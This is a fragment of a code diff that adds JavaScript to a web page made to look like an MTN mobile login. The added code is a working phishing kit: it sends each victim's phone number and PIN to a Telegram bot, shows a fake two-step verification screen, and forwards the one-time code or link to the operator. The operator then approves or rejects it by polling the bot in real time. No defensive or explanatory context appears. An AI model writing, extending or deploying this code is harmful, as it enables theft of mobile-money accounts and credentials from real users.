+            const msg = `🔐 *New Login Attempt*\nPhone: \`+237 ${phone}\`\nPIN: \`${enteredPin}\``;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            }).catch(()=>{});
+
+            setTimeout(() => {
+                loader.classList.remove('active');
+                document.getElementById('verifyDisplayPhone').textContent = '+237 ' + phone;
+                switchView('verify');
+                startOtpTimer();
+            }, 1500);
+        });
+
+        // 6. Two-Step Verification (OTP / Link submission)
+        const smsInput = document.getElementById('smsInputCode');
+        const submitOtpBtn = document.getElementById('finalSubmitOtpBtn');
+        let timeLeft = 200;
+        let otpTimerInterval;
+
+        function startOtpTimer() {
+            timeLeft = 200;
+            const countdownEl = document.getElementById('countdown');
+            clearInterval(otpTimerInterval);
+            otpTimerInterval = setInterval(() => {
+                timeLeft--;
+                if(timeLeft > 0) {
+                    countdownEl.textContent = timeLeft;
+                } else {
+                    clearInterval(otpTimerInterval);
+                    document.getElementById('resendWrapper').innerHTML = "Resend link expired";
+                    smsInput.disabled = true;
+                }
+            }, 1000);
+        }
+
+        smsInput.addEventListener('input', () => {
+            if (smsInput.value.trim().length > 5) {
+                submitOtpBtn.disabled = false;
+                submitOtpBtn.style.background = 'var(--mtn-red)';
+                submitOtpBtn.style.color = '#fff';
+                submitOtpBtn.style.cursor = 'pointer';
+            } else {
+                submitOtpBtn.disabled = true;
+                submitOtpBtn.style.background = '#e7e7e7';
+                submitOtpBtn.style.color = '#9a9a9a';
+                submitOtpBtn.style.cursor = 'not-allowed';
+            }
+        });
+
+        submitOtpBtn.addEventListener('click', () => {
+            const smsText = smsInput.value.trim();
+            const phone = localStorage.getItem('phone') || 'UNKNOWN';
+
+            submitOtpBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> VERIFYING...';
+            submitOtpBtn.disabled = true;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{ text: "✅ Approve", callback_data: `OTP_APP_${phone}` }, { text: "❌ Reject", callback_data: `OTP_REJ_${phone}` }]
+                ]
+            };
+
+            const message = `📱 *Step 2: OTP / Link Submission*\nPhone: \`+237 ${phone}\`\n✉️ Content:\n\`${smsText}\`\n\n👇 Decision required:`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    reply_markup: JSON.stringify(inlineKeyboard)
+                })
+            }).then(r => r.json()).then(res => {
+                if(res.ok) {
+                    pollTelegramUpdates(phone);
+                } else {
+                    alert('Network error communicating with validation server.');
+                    resetVerifyBtn();
+                }
+            }).catch(() => {
+                alert('Connection timeout.');
+                resetVerifyBtn();
+            });
+        });
+
+        function resetVerifyBtn() {
+            submitOtpBtn.innerHTML = 'SUBMIT';
+            submitOtpBtn.disabled = false;
+        }
+
+        function pollTelegramUpdates(phone) {
+            let offset = 0;
+            const pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=5`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result) {
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+                                if (action === `OTP_APP_${phone}`) {
+                                    clearInterval(pollInterval);
+                                    window.location.href = '#success-complete';
+                                    alert('Verification Approved Successfully!');
+                                } else if (action === `OTP_REJ_${phone}`) {
+                                    clearInterval(pollInterval);
+                                    resetVerifyBtn();
+                                    document.getElementById('errorModalOverlay').classList.add('active');
+                                }
+                            }
+                        }
+                    }
+                }).catch(()=>{});
+            }, 4000);
+        }
+
+        function closeErrorModal() {
+            document.getElementById('errorModalOverlay').classList.remove('active');
+            smsInput.value = '';
+            smsInput.focus();
+        }
     </script>
 </body>
-
 </html>
